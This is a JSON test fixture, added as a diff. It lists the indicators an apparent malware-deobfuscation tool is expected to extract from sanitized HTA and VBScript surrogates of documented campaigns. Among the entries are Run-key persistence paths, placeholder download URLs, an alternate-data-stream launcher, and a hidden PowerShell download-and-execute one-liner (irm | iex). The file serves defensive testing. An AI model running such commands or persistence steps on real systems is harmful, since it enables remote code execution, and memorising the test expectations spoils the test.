@@ -1,0 +1,406 @@
+{
+  "r1_scpc_dual_base64.hta": {
+    "expected": [
+      "Lightworks.Metadata",
+      "judgment",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\metrics",
+      "https://telegram.example.invalid/examplefeed",
+      "Xor71.autometrics.example.invalid"
+    ],
+    "source_pattern": "SCPC 2023 quicker.rtf HTA with two embedded base64 VBScripts; sanitized surrogate",
+    "parent_sample": "r1_scpc_dual_base64.hta",
+    "generated_variant": "base"
+  },
+  "r1_scpc_dual_base64__noise.hta": {
+    "expected": [
+      "Lightworks.Metadata",
+      "judgment",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\metrics",
+      "https://telegram.example.invalid/examplefeed",
+      "Xor71.autometrics.example.invalid"
+    ],
+    "source_pattern": "SCPC 2023 quicker.rtf HTA with two embedded base64 VBScripts; sanitized surrogate",
+    "parent_sample": "r1_scpc_dual_base64.hta",
+    "generated_variant": "__noise"
+  },
+  "r1_scpc_dual_base64__split.hta": {
+    "expected": [
+      "Lightworks.Metadata",
+      "judgment",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\metrics",
+      "https://telegram.example.invalid/examplefeed",
+      "Xor71.autometrics.example.invalid"
+    ],
+    "source_pattern": "SCPC 2023 quicker.rtf HTA with two embedded base64 VBScripts; sanitized surrogate",
+    "parent_sample": "r1_scpc_dual_base64.hta",
+    "generated_variant": "__split"
+  },
+  "r1_scpc_dual_base64__combo.hta": {
+    "expected": [
+      "Lightworks.Metadata",
+      "judgment",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\metrics",
+      "https://telegram.example.invalid/examplefeed",
+      "Xor71.autometrics.example.invalid"
+    ],
+    "source_pattern": "SCPC 2023 quicker.rtf HTA with two embedded base64 VBScripts; sanitized surrogate",
+    "parent_sample": "r1_scpc_dual_base64.hta",
+    "generated_variant": "__combo"
+  },
+  "r2_eset_heavy_hta.hta": {
+    "expected": [
+      "WScript.Shell",
+      "%windir%\\system32\\mshta.exe",
+      "https://yield-area-domestic.example.invalid/gpu/everyZ8K/madamewJ8.epub"
+    ],
+    "source_pattern": "ESET Gamaredon 2025 heavily obfuscated HTA with blank lines, fake C2s, and unused strings; sanitized surrogate",
+    "parent_sample": "r2_eset_heavy_hta.hta",
+    "generated_variant": "base"
+  },
+  "r2_eset_heavy_hta__noise.hta": {
+    "expected": [
+      "WScript.Shell",
+      "%windir%\\system32\\mshta.exe",
+      "https://yield-area-domestic.example.invalid/gpu/everyZ8K/madamewJ8.epub"
+    ],
+    "source_pattern": "ESET Gamaredon 2025 heavily obfuscated HTA with blank lines, fake C2s, and unused strings; sanitized surrogate",
+    "parent_sample": "r2_eset_heavy_hta.hta",
+    "generated_variant": "__noise"
+  },
+  "r2_eset_heavy_hta__split.hta": {
+    "expected": [
+      "WScript.Shell",
+      "%windir%\\system32\\mshta.exe",
+      "https://yield-area-domestic.example.invalid/gpu/everyZ8K/madamewJ8.epub"
+    ],
+    "source_pattern": "ESET Gamaredon 2025 heavily obfuscated HTA with blank lines, fake C2s, and unused strings; sanitized surrogate",
+    "parent_sample": "r2_eset_heavy_hta.hta",
+    "generated_variant": "__split"
+  },
+  "r2_eset_heavy_hta__combo.hta": {
+    "expected": [
+      "WScript.Shell",
+      "%windir%\\system32\\mshta.exe",
+      "https://yield-area-domestic.example.invalid/gpu/everyZ8K/madamewJ8.epub"
+    ],
+    "source_pattern": "ESET Gamaredon 2025 heavily obfuscated HTA with blank lines, fake C2s, and unused strings; sanitized surrogate",
+    "parent_sample": "r2_eset_heavy_hta.hta",
+    "generated_variant": "__combo"
+  },
+  "r3_eset_pteroquark_tokens.vbs": {
+    "expected": [
+      "HKCU\\SOFTWARE\\Example\\Cfg\\payload",
+      "https://seed.trycloudflare.example.invalid",
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid"
+    ],
+    "source_pattern": "ESET 2025 PteroQuark-style downloader with random ?? tokens inside base64 payload; sanitized surrogate",
+    "parent_sample": "r3_eset_pteroquark_tokens.vbs",
+    "generated_variant": "base"
+  },
+  "r3_eset_pteroquark_tokens__noise.vbs": {
+    "expected": [
+      "HKCU\\SOFTWARE\\Example\\Cfg\\payload",
+      "https://seed.trycloudflare.example.invalid",
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid"
+    ],
+    "source_pattern": "ESET 2025 PteroQuark-style downloader with random ?? tokens inside base64 payload; sanitized surrogate",
+    "parent_sample": "r3_eset_pteroquark_tokens.vbs",
+    "generated_variant": "__noise"
+  },
+  "r3_eset_pteroquark_tokens__split.vbs": {
+    "expected": [
+      "HKCU\\SOFTWARE\\Example\\Cfg\\payload",
+      "https://seed.trycloudflare.example.invalid",
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid"
+    ],
+    "source_pattern": "ESET 2025 PteroQuark-style downloader with random ?? tokens inside base64 payload; sanitized surrogate",
+    "parent_sample": "r3_eset_pteroquark_tokens.vbs",
+    "generated_variant": "__split"
+  },
+  "r3_eset_pteroquark_tokens__combo.vbs": {
+    "expected": [
+      "HKCU\\SOFTWARE\\Example\\Cfg\\payload",
+      "https://seed.trycloudflare.example.invalid",
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid"
+    ],
+    "source_pattern": "ESET 2025 PteroQuark-style downloader with random ?? tokens inside base64 payload; sanitized surrogate",
+    "parent_sample": "r3_eset_pteroquark_tokens.vbs",
+    "generated_variant": "__combo"
+  },
+  "r4_trend_void_banshee_stage3.hta": {
+    "expected": [
+      "powershell -nop -w hidden irm https://cdn.example.invalid/become.txt | iex",
+      "Win32_Process",
+      "irm",
+      "iex"
+    ],
+    "source_pattern": "Trend Micro 2024 HTA/VBScript stage with XOR-decoded PowerShell, irm/iex, and Win32_Process; sanitized surrogate",
+    "parent_sample": "r4_trend_void_banshee_stage3.hta",
+    "generated_variant": "base"
+  },
+  "r4_trend_void_banshee_stage3__noise.hta": {
+    "expected": [
+      "powershell -nop -w hidden irm https://cdn.example.invalid/become.txt | iex",
+      "Win32_Process",
+      "irm",
+      "iex"
+    ],
+    "source_pattern": "Trend Micro 2024 HTA/VBScript stage with XOR-decoded PowerShell, irm/iex, and Win32_Process; sanitized surrogate",
+    "parent_sample": "r4_trend_void_banshee_stage3.hta",
+    "generated_variant": "__noise"
+  },
+  "r4_trend_void_banshee_stage3__split.hta": {
+    "expected": [
+      "powershell -nop -w hidden irm https://cdn.example.invalid/become.txt | iex",
+      "Win32_Process",
+      "irm",
+      "iex"
+    ],
+    "source_pattern": "Trend Micro 2024 HTA/VBScript stage with XOR-decoded PowerShell, irm/iex, and Win32_Process; sanitized surrogate",
+    "parent_sample": "r4_trend_void_banshee_stage3.hta",
+    "generated_variant": "__split"
+  },
+  "r4_trend_void_banshee_stage3__combo.hta": {
+    "expected": [
+      "powershell -nop -w hidden irm https://cdn.example.invalid/become.txt | iex",
+      "Win32_Process",
+      "irm",
+      "iex"
+    ],
+    "source_pattern": "Trend Micro 2024 HTA/VBScript stage with XOR-decoded PowerShell, irm/iex, and Win32_Process; sanitized surrogate",
+    "parent_sample": "r4_trend_void_banshee_stage3.hta",
+    "generated_variant": "__combo"
+  },
+  "r5_microsoft_whatsapp_stage1.vbs": {
+    "expected": [
+      "C:\\ProgramData\\SyncStore",
+      "netapi.dll",
+      "sc.exe",
+      "https://bucket.example.invalid/bootstrap.dat",
+      "https://b2.example.invalid/secondary.msi",
+      "curl.exe",
+      "bitsadmin.exe"
+    ],
+    "source_pattern": "Microsoft 2026 VBS stage creating hidden ProgramData folder and dropping renamed curl.exe/bitsadmin.exe; sanitized surrogate",
+    "parent_sample": "r5_microsoft_whatsapp_stage1.vbs",
+    "generated_variant": "base"
+  },
+  "r5_microsoft_whatsapp_stage1__noise.vbs": {
+    "expected": [
+      "C:\\ProgramData\\SyncStore",
+      "netapi.dll",
+      "sc.exe",
+      "https://bucket.example.invalid/bootstrap.dat",
+      "https://b2.example.invalid/secondary.msi",
+      "curl.exe",
+      "bitsadmin.exe"
+    ],
+    "source_pattern": "Microsoft 2026 VBS stage creating hidden ProgramData folder and dropping renamed curl.exe/bitsadmin.exe; sanitized surrogate",
+    "parent_sample": "r5_microsoft_whatsapp_stage1.vbs",
+    "generated_variant": "__noise"
+  },
+  "r5_microsoft_whatsapp_stage1__split.vbs": {
+    "expected": [
+      "C:\\ProgramData\\SyncStore",
+      "netapi.dll",
+      "sc.exe",
+      "https://bucket.example.invalid/bootstrap.dat",
+      "https://b2.example.invalid/secondary.msi",
+      "curl.exe",
+      "bitsadmin.exe"
+    ],
+    "source_pattern": "Microsoft 2026 VBS stage creating hidden ProgramData folder and dropping renamed curl.exe/bitsadmin.exe; sanitized surrogate",
+    "parent_sample": "r5_microsoft_whatsapp_stage1.vbs",
+    "generated_variant": "__split"
+  },
+  "r5_microsoft_whatsapp_stage1__combo.vbs": {
+    "expected": [
+      "C:\\ProgramData\\SyncStore",
+      "netapi.dll",
+      "sc.exe",
+      "https://bucket.example.invalid/bootstrap.dat",
+      "https://b2.example.invalid/secondary.msi",
+      "curl.exe",
+      "bitsadmin.exe"
+    ],
+    "source_pattern": "Microsoft 2026 VBS stage creating hidden ProgramData folder and dropping renamed curl.exe/bitsadmin.exe; sanitized surrogate",
+    "parent_sample": "r5_microsoft_whatsapp_stage1.vbs",
+    "generated_variant": "__combo"
+  },
+  "r6_fortinet_layered_parts.vbs": {
+    "expected": [
+      "WScript.Shell",
+      "https://github.example.invalid/raw/refs/heads/main/install.exe",
+      "https://dropbox.example.invalid/svchost.scr",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svc"
+    ],
+    "source_pattern": "Fortinet 2026 obfuscated VBScript orchestrator with Part1/Part2 concatenation, Base64 reconstruction, and ExecuteGlobal; sanitized surrogate",
+    "parent_sample": "r6_fortinet_layered_parts.vbs",
+    "generated_variant": "base"
+  },
+  "r6_fortinet_layered_parts__noise.vbs": {
+    "expected": [
+      "WScript.Shell",
+      "https://github.example.invalid/raw/refs/heads/main/install.exe",
+      "https://dropbox.example.invalid/svchost.scr",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svc"
+    ],
+    "source_pattern": "Fortinet 2026 obfuscated VBScript orchestrator with Part1/Part2 concatenation, Base64 reconstruction, and ExecuteGlobal; sanitized surrogate",
+    "parent_sample": "r6_fortinet_layered_parts.vbs",
+    "generated_variant": "__noise"
+  },
+  "r6_fortinet_layered_parts__split.vbs": {
+    "expected": [
+      "WScript.Shell",
+      "https://github.example.invalid/raw/refs/heads/main/install.exe",
+      "https://dropbox.example.invalid/svchost.scr",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svc"
+    ],
+    "source_pattern": "Fortinet 2026 obfuscated VBScript orchestrator with Part1/Part2 concatenation, Base64 reconstruction, and ExecuteGlobal; sanitized surrogate",
+    "parent_sample": "r6_fortinet_layered_parts.vbs",
+    "generated_variant": "__split"
+  },
+  "r6_fortinet_layered_parts__combo.vbs": {
+    "expected": [
+      "WScript.Shell",
+      "https://github.example.invalid/raw/refs/heads/main/install.exe",
+      "https://dropbox.example.invalid/svchost.scr",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svc"
+    ],
+    "source_pattern": "Fortinet 2026 obfuscated VBScript orchestrator with Part1/Part2 concatenation, Base64 reconstruction, and ExecuteGlobal; sanitized surrogate",
+    "parent_sample": "r6_fortinet_layered_parts.vbs",
+    "generated_variant": "__combo"
+  },
+  "r7_eset_fallback_branch.vbs": {
+    "expected": [
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid",
+      "WScript.Echo"
+    ],
+    "source_pattern": "ESET 2025 fallback selection between telegraph-style feed and hardcoded backup; sanitized branch-bearing surrogate",
+    "parent_sample": "r7_eset_fallback_branch.vbs",
+    "generated_variant": "base"
+  },
+  "r7_eset_fallback_branch__noise.vbs": {
+    "expected": [
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid",
+      "WScript.Echo"
+    ],
+    "source_pattern": "ESET 2025 fallback selection between telegraph-style feed and hardcoded backup; sanitized branch-bearing surrogate",
+    "parent_sample": "r7_eset_fallback_branch.vbs",
+    "generated_variant": "__noise"
+  },
+  "r7_eset_fallback_branch__split.vbs": {
+    "expected": [
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid",
+      "WScript.Echo"
+    ],
+    "source_pattern": "ESET 2025 fallback selection between telegraph-style feed and hardcoded backup; sanitized branch-bearing surrogate",
+    "parent_sample": "r7_eset_fallback_branch.vbs",
+    "generated_variant": "__split"
+  },
+  "r7_eset_fallback_branch__combo.vbs": {
+    "expected": [
+      "https://telegraph.example.invalid/example-primary",
+      "https://backup.example.invalid",
+      "WScript.Echo"
+    ],
+    "source_pattern": "ESET 2025 fallback selection between telegraph-style feed and hardcoded backup; sanitized branch-bearing surrogate",
+    "parent_sample": "r7_eset_fallback_branch.vbs",
+    "generated_variant": "__combo"
+  },
+  "r8_cloudatlas_ads.hta": {
+    "source_pattern": "Kaspersky 2024 Cloud Atlas HTA/VBShower with ADS-backed VBS launcher and autorun key; sanitized surrogate",
+    "expected": [
+      "%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dmwappushservice",
+      "wscript /B \"%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs\"",
+      "https://cloud.example.invalid/api"
+    ],
+    "parent_sample": "r8_cloudatlas_ads.hta",
+    "generated_variant": "base"
+  },
+  "r8_cloudatlas_ads__noise.hta": {
+    "source_pattern": "Kaspersky 2024 Cloud Atlas HTA/VBShower with ADS-backed VBS launcher and autorun key; sanitized surrogate",
+    "expected": [
+      "%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dmwappushservice",
+      "wscript /B \"%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs\"",
+      "https://cloud.example.invalid/api"
+    ],
+    "parent_sample": "r8_cloudatlas_ads.hta",
+    "generated_variant": "__noise"
+  },
+  "r8_cloudatlas_ads__split.hta": {
+    "source_pattern": "Kaspersky 2024 Cloud Atlas HTA/VBShower with ADS-backed VBS launcher and autorun key; sanitized surrogate",
+    "expected": [
+      "%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dmwappushservice",
+      "wscript /B \"%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs\"",
+      "https://cloud.example.invalid/api"
+    ],
+    "parent_sample": "r8_cloudatlas_ads.hta",
+    "generated_variant": "__split"
+  },
+  "r8_cloudatlas_ads__combo.hta": {
+    "source_pattern": "Kaspersky 2024 Cloud Atlas HTA/VBShower with ADS-backed VBS launcher and autorun key; sanitized surrogate",
+    "expected": [
+      "%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs",
+      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dmwappushservice",
+      "wscript /B \"%APPDATA%\\Roaming\\Microsoft\\Windows\\AppCache028732611605321388.log:AppCache028732611605321388.vbs\"",
+      "https://cloud.example.invalid/api"
+    ],
+    "parent_sample": "r8_cloudatlas_ads.hta",
+    "generated_variant": "__combo"
+  },
+  "r9_mwb_chr_execute.vbs": {
+    "source_pattern": "Malwarebytes 2016 de-obfuscating malicious VBScripts: Chr(...) string build plus Execute; sanitized surrogate",
+    "expected": [
+      "https://retro.example.invalid/setup.exe",
+      "MSXML2.XMLHTTP",
+      "WScript.Shell",
+      "WScript.Echo"
+    ],
+    "parent_sample": "r9_mwb_chr_execute.vbs",
+    "generated_variant": "base"
+  },
+  "r9_mwb_chr_execute__noise.vbs": {
+    "source_pattern": "Malwarebytes 2016 de-obfuscating malicious VBScripts: Chr(...) string build plus Execute; sanitized surrogate",
+    "expected": [
+      "https://retro.example.invalid/setup.exe",
+      "MSXML2.XMLHTTP",
+      "WScript.Shell",
+      "WScript.Echo"
+    ],
+    "parent_sample": "r9_mwb_chr_execute.vbs",
+    "generated_variant": "__noise"
+  },
+  "r9_mwb_chr_execute__split.vbs": {
+    "source_pattern": "Malwarebytes 2016 de-obfuscating malicious VBScripts: Chr(...) string build plus Execute; sanitized surrogate",
+    "expected": [
+      "https://retro.example.invalid/setup.exe",
+      "MSXML2.XMLHTTP",
+      "WScript.Shell",
+      "WScript.Echo"
+    ],
+    "parent_sample": "r9_mwb_chr_execute.vbs",
+    "generated_variant": "__split"
+  },
+  "r9_mwb_chr_execute__combo.vbs": {
+    "source_pattern": "Malwarebytes 2016 de-obfuscating malicious VBScripts: Chr(...) string build plus Execute; sanitized surrogate",
+    "expected": [
+      "https://retro.example.invalid/setup.exe",
+      "MSXML2.XMLHTTP",
+      "WScript.Shell",
+      "WScript.Echo"
+    ],
+    "parent_sample": "r9_mwb_chr_execute.vbs",
+    "generated_variant": "__combo"
+  }
+}
